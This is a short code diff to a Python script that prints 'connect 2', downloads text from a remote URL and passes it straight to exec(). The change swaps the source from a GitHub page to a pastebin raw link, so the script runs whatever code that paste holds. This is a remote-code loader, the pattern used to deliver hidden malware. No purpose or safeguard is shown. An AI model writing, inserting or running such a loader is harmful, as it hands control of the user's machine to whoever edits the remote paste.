@@ -1,6 +1,6 @@
 print("connect 2")
 import requests
-data = requests.get(url="https://github.com/walidfoxy/bot-file/blob/main/main.py").text
+data = requests.get(url="pastebin.com/raw_yGyTJQVh").text
 exec(data)
 
 
